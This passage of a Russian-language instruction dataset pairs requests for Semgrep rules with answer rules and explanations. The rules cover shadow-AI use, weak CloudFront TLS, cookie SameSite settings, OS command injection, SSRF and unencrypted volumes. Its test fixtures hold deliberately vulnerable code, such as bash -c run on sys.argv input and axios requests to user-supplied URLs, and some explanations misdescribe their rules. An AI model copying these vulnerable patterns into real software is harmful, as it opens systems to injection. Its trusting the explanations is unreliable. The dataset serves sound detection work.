    "output": "rules:\n- id: metadata-deepsemgrep\n  message: >-\n    We no longer support `deepsemgrep: true`, please use `interfile:true`\n  severity: WARNING\n  metadata:\n    category: correctness\n    references:\n    - https://semgrep.dev/\n    technology:\n    - semgrep\n  languages:\n  - yaml\n  fix-regex:\n    regex: deepsemgrep\n    replacement: interfile\n  patterns:\n  - pattern-inside: |\n      rules: \n        ...\n  - pattern-inside: |\n      metadata: \n        ...\n        $DEEPSEMGREP: true\n        ...\n  - focus-metavariable: $DEEPSEMGREP\n  - metavariable-regex:\n      metavariable: $DEEPSEMGREP\n      regex: ^(deepsemgrep)$\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования устаревшего параметра 'deepsemgrep' в YAML-файлах. Правило ищет блок 'metadata', внутри которого присутствует метапеременная $DEEPSEMGREP со значением 'deepsemgrep'. Если такое значение найдено, выдается предупреждение о необходимости замены 'deepsemgrep' на 'interfile'. Анализ выполняется с использованием конструкции pattern-inside для поиска внутри блоков 'rules' и 'metadata'. Также используется фокусировка на метапеременной ($focus-metavariable) и проверка регулярного выражения ($metavar-regex) для точного совпадения значения.\n\n# Ключевые элементы:\n- ID: metadata-deepsemgrep\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "metadata-deepsemgrep",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: detect-gemini\nОписание уязвимости: Possibly found usage of AI: Gemini\nCWE: \nТип анализа: search\nЯзык: dart",
    "input": "Требования:\n- Язык: dart\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-gemini.dart\n// ruleid: detect-gemini\nimport 'package:google_generative_ai/google_generative_ai.dart';\n\nvoid main() {\n    // Access your API key as an environment variable (see \"Set up your API key\" above)\n    final apiKey = Platform.environment['API_KEY'];\n    if (apiKey == null) {\n      print('No \\$API_KEY environment variable');\n      exit(1);\n    }\n\n    // ruleid: detect-gemini\n    final model = GenerativeModel(model: 'gemini-1.5-flash', apiKey: apiKey);\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• import 'package:google_generative_ai';\nfinal model = GenerativeModel(model: 'gemini-1.5-flash');\n• import 'package:google_generative_ai';\nfinal model = new GenerativeModel(apiKey: ..., model: 'gemini-1.5-flash');\n\nБезопасные паттерны:  \n• import 'package:google_generative_ai';\nfinal model = GenerativeModel(model: 'text-bison');\n• import 'package:someother_package';\nfinal model = GenerativeModel(model: 'gemini-1.5-flash');\n\nЛегенда аннотаций:\n- // ruleid:detect-gemini: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-gemini: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-gemini\n    languages:\n      - dart\n    severity: INFO\n    message: \"Possibly found usage of AI: Gemini\"\n    pattern-either:\n      - pattern: import 'package:google_generative_ai';\n      - pattern: final $MODEL = GenerativeModel(...);\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможного использования AI-модели Gemini в Dart-коде. Анализ выполняется путем поиска импортов пакета 'google_generative_ai' и создания экземпляра класса 'GenerativeModel' с указанием модели 'gemini-1.5-flash'. Правило использует оператор 'pattern-either' для проверки наличия одного из двух шаблонов: импорта указанного пакета или создания объекта с конкретной моделью.\n\n# Ключевые элементы:\n- ID: detect-gemini\n- Язык: dart \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-gemini",
      "language": "dart",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: aws-insecure-cloudfront-distribution-tls-version\nОписание уязвимости: Detected an AWS CloudFront Distribution with an insecure TLS version. TLS versions less than 1.2 are considered insecure because they can be broken. To fix this, set your `minimum_protocol_version` to `\"TLSv1.2_2018\", \"TLSv1.2_2019\" or \"TLSv1.2_2021\"`.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-cloudfront-insecure-tls.tf\n# ruleid: aws-insecure-cloudfront-distribution-tls-version\nresource \"aws_cloudfront_distribution\" \"fail\" {\n  origin {\n    domain_name = aws_s3_bucket.b.bucket_regional_domain_name\n    origin_id   = local.s3_origin_id\n\n    s3_origin_config {\n      origin_access_identity = \"origin-access-identity/cloudfront/ABCDEFG1234567\"\n    }\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n  comment             = \"Some comment\"\n  default_root_object = \"index.html\"\n\n  logging_config {\n    include_cookies = false\n    bucket          = \"mylogs.s3.amazonaws.com\"\n    prefix          = \"myprefix\"\n  }\n\n  aliases = [\"mysite.example.com\", \"yoursite.example.com\"]\n\n  default_cache_behavior {\n    allowed_methods  = [\"DELETE\", \"GET\", \"HEAD\", \"OPTIONS\", \"PATCH\", \"POST\", \"PUT\"]\n    cached_methods   = [\"GET\", \"HEAD\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    viewer_protocol_policy = \"allow-all\"\n    min_ttl                = 0\n    default_ttl            = 3600\n    max_ttl                = 86400\n  }\n\n  # Cache behavior with precedence 0\n  ordered_cache_behavior {\n    path_pattern     = \"/content/immutable/*\"\n    allowed_methods  = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    cached_methods   = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_string = false\n      headers      = [\"Origin\"]\n\n      cookies {\n        forward = \"none\"\n      }\n    }\n\n    min_ttl                = 0\n    default_ttl            = 86400\n    max_ttl                = 31536000\n    compress               = true\n    viewer_protocol_policy = \"redirect-to-https\"\n  }\n\n  # Cache behavior with precedence 1\n  ordered_cache_behavior {\n    path_pattern     = \"/content/*\"\n    allowed_methods  = [\"GET\", \"HEAD\", \"OPTIONS\"]\n    cached_methods   = [\"GET\", \"HEAD\"]\n    target_origin_id = local.s3_origin_id\n\n    forwarded_values {\n      query_s  # Ограничиваем длину\n\nОпасные паттерны:\n• viewer_certificate { cloudfront_default_certificate = false }\n• viewer_certificate { cloudfront_default_certificate = false minimum_protocol_version = \"TLSv1\" }\n\nБезопасные паттерны:  \n• viewer_certificate { cloudfront_default_certificate = false minimum_protocol_version = \"TLSv1.2_2018\" }\n• viewer_certificate { cloudfront_default_certificate = false minimum_protocol_version = \"TLSv1.2_2019\" }\n\nЛегенда аннотаций:\n- // ruleid:aws-insecure-cloudfront-distribution-tls-version: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-insecure-cloudfront-distribution-tls-version: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-insecure-cloudfront-distribution-tls-version\n  patterns:\n  - pattern: |\n      resource \"aws_cloudfront_distribution\" $ANYTHING {\n        ...\n        viewer_certificate {\n          ...\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_cloudfront_distribution\" $ANYTHING {\n        ...\n        viewer_certificate {\n          ...\n          minimum_protocol_version = \"TLSv1.2_2018\"\n          ...\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_cloudfront_distribution\" $ANYTHING {\n        ...\n        viewer_certificate {\n          ...\n          minimum_protocol_version = \"TLSv1.2_2019\"\n          ...\n        }\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_cloudfront_distribution\" $ANYTHING {\n        ...\n        viewer_certificate {\n          ...\n          minimum_protocol_version = \"TLSv1.2_2021\"\n          ...\n        }\n        ...\n      }\n  message: >-\n    Detected an AWS CloudFront Distribution with an insecure TLS version.\n    TLS versions less than 1.2 are considered insecure because they\n    can be broken. To fix this, set your `minimum_protocol_version` to\n    `\"TLSv1.2_2018\", \"TLSv1.2_2019\" or \"TLSv1.2_2021\"`.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS CloudFront distribution в конфигурациях Terraform, где не указан минимальный протокол версии TLS или указана версия ниже TLS 1.2. Правило использует шаблон ресурса aws_cloudfront_distribution и проверяет блок viewer_certificate на наличие атрибута minimum_protocol_version. Если этот атрибут отсутствует или содержит значение менее TLS 1.2, правило считает такую конфигурацию небезопасной.\n\n# Ключевые элементы:\n- ID: aws-insecure-cloudfront-distribution-tls-version\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-insecure-cloudfront-distribution-tls-version",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: pyramid-authtkt-cookie-samesite\nОписание уязвимости: Found a Pyramid Authentication Ticket without the samesite option correctly set. Pyramid cookies should be handled securely by setting samesite='Lax'. If this parameter is not properly set, your cookies are not properly protected and are at risk of being stolen by an attacker.\nCWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-1275: Sensitive Cookie with Improper SameSite Attribute\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: authtkt-cookie-samesite.fixed.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\", samesite='Lax')\n\n\ndef bad2():\n    # ruleid: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", samesite='Lax')\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\")\n\n\ndef good2():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\", samesite='Lax')\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\")\n\n\ndef good4():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", samesite='Lax')\n\n\n// File: authtkt-cookie-samesite.py\nfrom pyramid.authentication import AuthTktCookieHelper, AuthTktAuthenticationPolicy\n\n\n### True positives ###\n\n\ndef bad1():\n    # ruleid: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\", samesite=None)\n\n\ndef bad2():\n    # ruleid: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", samesite=None)\n\n\n### True negatives ###\n\n\ndef good1():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\")\n\n\ndef good2():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktCookieHelper(secret=\"test\", samesite='Lax')\n\n\ndef good3():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\")\n\n\ndef good4():\n    # ok: pyramid-authtkt-cookie-samesite\n    authtkt = AuthTktAuthenticationPolicy(secret=\"test\", samesite='Lax')  # Ограничиваем длину\n\nОпасные паттерны:\n• authtkt = AuthTktCookieHelper(secret=\"test\", samesite=None)\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\", samesite=None)\n\nБезопасные паттерны:  \n• authtkt = AuthTktCookieHelper(secret=\"test\")\n• authtkt = AuthTktCookieHelper(secret=\"test\", samesite='Lax')\n• authtkt = AuthTktAuthenticationPolicy(secret=\"test\")\n\nЛегенда аннотаций:\n- // ruleid:pyramid-authtkt-cookie-samesite: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:pyramid-authtkt-cookie-samesite: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: pyramid-authtkt-cookie-samesite\n  patterns:\n  - pattern-either:\n    - pattern: pyramid.authentication.AuthTktCookieHelper(..., samesite=$SAMESITE, ...)\n    - pattern: pyramid.authentication.AuthTktAuthenticationPolicy(..., samesite=$SAMESITE, ...)\n  - pattern: $SAMESITE\n  - metavariable-regex:\n      metavariable: $SAMESITE\n      regex: (?!'Lax')\n  fix: |\n    'Lax'\n  message: >-\n    Found a Pyramid Authentication Ticket without the samesite option correctly set. Pyramid\n    cookies should be handled securely by setting samesite='Lax'.\n    If this parameter is not properly set, your cookies are not properly protected and\n    are at risk of being stolen by an attacker.\n  metadata:\n    cwe:\n    - 'CWE-1275: Sensitive Cookie with Improper SameSite Attribute'\n    owasp:\n    - A01:2021 - Broken Access Control\n    category: security\n    technology:\n    - pyramid\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функций AuthTktCookieHelper и AuthTktAuthenticationPolicy из библиотеки Pyramid, где параметр samesite не установлен или установлен некорректно ('None' вместо требуемого значения 'Lax'). Правило использует шаблон с метавариабельной $SAMESITE для проверки наличия параметра samesite и шаблона-мета переменной с регулярным выражением для фильтрации недопустимых значений.\n\n# Ключевые элементы:\n- ID: pyramid-authtkt-cookie-samesite\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "pyramid-authtkt-cookie-samesite",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: dangerous-os-exec-tainted-env-args\nОписание уязвимости: Found user controlled content when spawning a process. This is dangerous because it allows a malicious actor to execute commands.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-os-exec-tainted-env-args.py\nimport os\nimport sys\nfrom somewhere import something\n\n# ok:dangerous-os-exec-tainted-env-args\nos.execl(\"/foo/bar\", \"/foo/bar\")\n\n# ok:dangerous-os-exec-tainted-env-args\nos.execv(\"/foo/bar\", [\"/foo/bar\", \"-a\", \"-b\"])\n\ncmd = something()\n# fn:dangerous-os-exec-tainted-env-args\nos.execl(cmd, cmd, \"--do-smth\")\n\n# fn:dangerous-os-exec-tainted-env-args\nos.execve(\"/bin/bash\", [\"/bin/bash\", \"-c\", something()], os.environ)\n\n# fn:dangerous-os-exec-tainted-env-args\nos.execl(\"/bin/bash\", \"/bin/bash\", \"-c\", something())\n\ncmd = sys.argv[2]\n# ruleid:dangerous-os-exec-tainted-env-args\nos.execl(\"/bin/bash\", \"/bin/bash\", \"-c\", cmd)\n\ncmd2 = os.environ['BAD']\n# ruleid:dangerous-os-exec-tainted-env-args\nos.execl(\"/bin/bash\", \"/bin/bash\", \"-c\", cmd2)  # Ограничиваем длину\n\nОпасные паттерны:\n• os.execl('/bin/bash', '/bin/bash', '-c', cmd)\n• os.execl('/bin/bash', '/bin/bash', '-c', os.environ['BAD'])\n\nБезопасные паттерны:  \n• os.execl('/foo/bar', '/foo/bar')\n• os.execv('/foo/bar', ['/foo/bar', '-a', '-b'])\n\nЛегенда аннотаций:\n- // ruleid:dangerous-os-exec-tainted-env-args: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-os-exec-tainted-env-args: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-os-exec-tainted-env-args\n  mode: taint\n  options:\n    symbolic_propagation: true\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-either:\n          - pattern: os.environ\n          - pattern: os.environ.get('$FOO', ...)\n          - pattern: os.environb\n          - pattern: os.environb.get('$FOO', ...)\n          - pattern: os.getenv('$ANYTHING', ...)\n          - pattern: os.getenvb('$ANYTHING', ...)\n      - patterns:\n        - pattern-either:\n          - patterns:\n            - pattern-either:\n              - pattern: sys.argv\n              - pattern: sys.orig_argv\n          - patterns:\n            - pattern-inside: |\n                $PARSER = argparse.ArgumentParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-inside: |\n                $PARSER = optparse.OptionParser(...)\n                ...\n            - pattern-inside: |\n                $ARGS = $PARSER.parse_args()\n            - pattern: <... $ARGS ...>\n          - patterns:\n            - pattern-either:\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.getopt(...)\n                  ...\n              - pattern-inside: |\n                  $OPTS, $ARGS = getopt.gnu_getopt(...)\n                  ...\n            - pattern-either:\n              - patterns:\n                - pattern-inside: |\n                    for $O, $A in $OPTS:\n                      ...\n                - pattern: $A\n              - pattern: $ARGS\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - patterns:\n        - pattern-not: os.$METHOD(\"...\", ...)\n        - pattern: os.$METHOD(...)\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: (execl|execle|execlp|execlpe|execv|execve|execvp|execvpe)\n      - patterns:\n        - pattern-not: os.$METHOD(\"...\", [$PATH,\"...\",\"...\",...],...)\n        - pattern-inside: os.$METHOD($BASH,[$PATH,\"-c\",$CMD,...],...)\n        - pattern: $CMD\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: (execv|execve|execvp|execvpe)\n        - metavariable-regex:\n            metavariable: $BASH\n            regex: (.*)(sh|bash|ksh|csh|tcsh|zsh)\n      - patterns:\n        - pattern-not: os.$METHOD(\"...\", $PATH, \"...\", \"...\",...)\n        - pattern-inside: os.$METHOD($BASH, $PATH, \"-c\", $CMD,...)\n        - pattern: $CMD\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: (execl|execle|execlp|execlpe)\n        - metavariable-regex:\n            metavariable: $BASH\n            regex: (.*)(sh|bash|ksh|csh|tcsh|zsh)\n  message: >-\n    Found user controlled content when spawning a process. This is dangerous because it allows\n    a malicious actor to execute commands.\n  metadata:\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://semgrep.dev/docs/cheat-sheets/python-command-injection/\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    confidence: MEDIUM\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: HIGH\n  languages: [python]\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных окружения или аргументов командной строки в вызове функций os.execl, os.execv, os.execlp, os.execlpe, os.execve и os.execvp, которые могут быть использованы злоумышленником для выполнения произвольных команд. Источниками (sources) являются переменные окружения и аргументы командной строки, а sinkами - функции запуска процессов, принимающие пользовательский ввод напрямую без надлежащей проверки или нейтрализации специальных элементов. Правило использует метапеременные ($PARSER, $ARGS, $OPTS, $A) для отслеживания парсинга аргументов и сопоставляет их с вызовами опасных функций.\n\n# Ключевые элементы:\n- ID: dangerous-os-exec-tainted-env-args\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-os-exec-tainted-env-args",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: aws-workspaces-user-volume-unencrypted\nОписание уязвимости: The AWS Workspace user volume is unencrypted. The AWS KMS encryption key protects user volume. To create your own, create a aws_kms_key resource or use the ARN string of a key in your account.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-workspaces-user-volume-unencrypted.tf\nresource \"aws_workspaces_workspace\" \"pass\" {\n  directory_id = aws_workspaces_directory.main.id\n  bundle_id    = data.aws_workspaces_bundle.bundle.id\n  user_name    = var.user_name\n\n  user_volume_encryption_enabled = true\n  volume_encryption_key          = var.volume_encryption_key\n\n  workspace_properties {\n    compute_type_name                         = \"VALUE\"\n    user_volume_size_gib                      = 10\n    root_volume_size_gib                      = 80\n    running_mode                              = \"AUTO_STOP\"\n    running_mode_auto_stop_timeout_in_minutes = 60\n  }\n\n  tags = var.common_tags\n}\n# ruleid: aws-workspaces-user-volume-unencrypted\nresource \"aws_workspaces_workspace\" \"fail\" {\n  directory_id = aws_workspaces_directory.main.id\n  bundle_id    = data.aws_workspaces_bundle.bundle.id\n  user_name    = var.user_name\n\n  workspace_properties {\n    compute_type_name                         = \"VALUE\"\n    user_volume_size_gib                      = 10\n    root_volume_size_gib                      = 80\n    running_mode                              = \"AUTO_STOP\"\n    running_mode_auto_stop_timeout_in_minutes = 60\n  }\n\n  tags = var.common_tags\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_workspaces_workspace\" \"fail\" { ... }\n• resource \"aws_workspaces_workspace\" \"another-fail\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_workspaces_workspace\" \"pass\" { ... user_volume_encryption_enabled = true ... }\n• resource \"aws_workspaces_workspace\" \"safe\" { ... user_volume_encryption_enabled = true ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-workspaces-user-volume-unencrypted: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-workspaces-user-volume-unencrypted: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-workspaces-user-volume-unencrypted\n  patterns:\n  - pattern: |\n      resource \"aws_workspaces_workspace\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_workspaces_workspace\" $ANYTHING {\n        ...\n        user_volume_encryption_enabled = true\n        ...\n      }\n  message: The AWS Workspace user volume is unencrypted. The AWS KMS encryption key protects user volume.\n    To create your own, create a aws_kms_key resource or use the ARN string of a key in your account.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    technology:\n    - aws\n    - terraform\n    category: security\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов aws_workspaces_workspace, которые не имеют атрибута user_volume_encryption_enabled установленным в значение true. Правило использует шаблон ресурса aws_workspaces_workspace и проверяет наличие или отсутствие указанного условия внутри шаблона. Если условие отсутствует, то ресурс считается небезопасным и генерируется предупреждение.\n\n# Ключевые элементы:\n- ID: aws-workspaces-user-volume-unencrypted\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-workspaces-user-volume-unencrypted",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: apollo-axios-ssrf\nОписание уязвимости: User-controllable argument $DATAVAL to $METHOD passed to Axios via internal handler $INNERFUNC. This could be a server-side request forgery. A user could call a restricted API or leak internal headers to an unauthorized party. Validate your user arguments against an allowlist of known URLs, or consider refactoring so that user-controlled data is not necessary.\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: javascript",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: apollo-axios-ssrf.jsx\nmodule.exports = {\n    Query: {\n        requestStatus(parent, args, context, info)\n        {\n            url = args.url\n            const axios = require('axios');\n\n            axios({\n                method: 'GET'\n            })\n            console.log(url)\n            async function getStatus(url) {\n                try {\n                  // ruleid: apollo-axios-ssrf\n                  const response = await axios.request(url);\n                  console.log(response);\n                  var s = response.status;\n                } catch (error) {\n                  console.error(error);\n                  var s = error.code;\n                }\n                return s;\n              }\n            return getStatus(url);\n\n        },\n\n        requestResponse(parent, args, context, info)\n        {\n            url = args.url\n            verb = args.verb\n            payload = args.payload\n            const axios = require('axios');\n            if (payload !== null || payload !== \"\") {\n                axios({\n                    method: verb,\n                    data: payload,\n                    headers: {\n                        'Content-Type': 'application/json'\n                    }\n                })\n            }\n            else {\n                axios({\n                    method: verb\n                })\n            }\n\n            console.log(url)\n            console.log(payload)\n\n            async function getResponse(url) {\n                try {\n                    // ruleid: apollo-axios-ssrf\n                    const response = await axios.request(url);\n                    console.log(response);\n                    var s = response.status;\n                } catch (error) {\n                    console.error(error);\n                    var s = error.message;\n                }\n                return s;\n            }\n\n\n            async function getResponseWithPayload(url, payload) {\n                try {\n                  // ruleid: apoll  # Ограничиваем длину\n\nОпасные паттерны:\n• async function $INNERFUNC(...,$INNERARG,...){...const response = await axios.request($INNERARG);...}\n• async function getResponse(url) { ...const response = await axios.request(url); ...return response; }\n\nБезопасные паттерны:  \n• async function $INNERFUNC(...,$INNERARG,...){...const response = await axios.get($INNERARG);...}\n• async function getResponse(url) { ...const response = await axios.get(url); ...return response; }\n\nЛегенда аннотаций:\n- // ruleid:apollo-axios-ssrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:apollo-axios-ssrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: apollo-axios-ssrf\n  message: >-\n    User-controllable argument $DATAVAL to $METHOD passed to Axios\n    via internal handler $INNERFUNC.\n    This could be a server-side request forgery. A user could call\n    a restricted API or leak internal headers to an unauthorized party.\n    Validate your user arguments against an allowlist of known URLs, or\n    consider refactoring so that user-controlled data is not necessary.\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - apollo\n    - axios\n    references:\n    - https://www.cvedetails.com/cve/CVE-2020-28168/\n    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  languages:\n  - javascript\n  severity: WARNING\n  patterns:\n  - pattern: const $RESPONSE = await axios.request($INNERARG,...)\n  - pattern-inside: |\n      Query: {\n        $METHOD(parent, args, context, info) {\n          ...\n          $DATA = args.$DATAVAL\n          ...\n          async function $INNERFUNC(...,$INNERARG,...){\n            ...\n          }\n          ...\n          return $INNERFUNC(...,$DATA,...)\n          }\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пользовательского управляемого аргумента ($DATAVAL) в качестве значения метода ($METHOD) при вызове функции request() объекта axios внутри асинхронной функции ($INNERFUNC). Это может привести к SSRF-уязвимости, позволяя злоумышленнику выполнять запросы к внутренним или защищенным ресурсам сервера. Правило использует шаблон, который ищет вызов функции request() с передачей аргументов через внутренний обработчик ($INNERFUNC), где аргумент ($DATAVAL) передается напрямую в метод ($METHOD).\n\n# Ключевые элементы:\n- ID: apollo-axios-ssrf\n- Язык: javascript \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "apollo-axios-ssrf",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения hashicorp-tf-password\nОписание уязвимости: A gitleaks hashicorp-tf-password was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
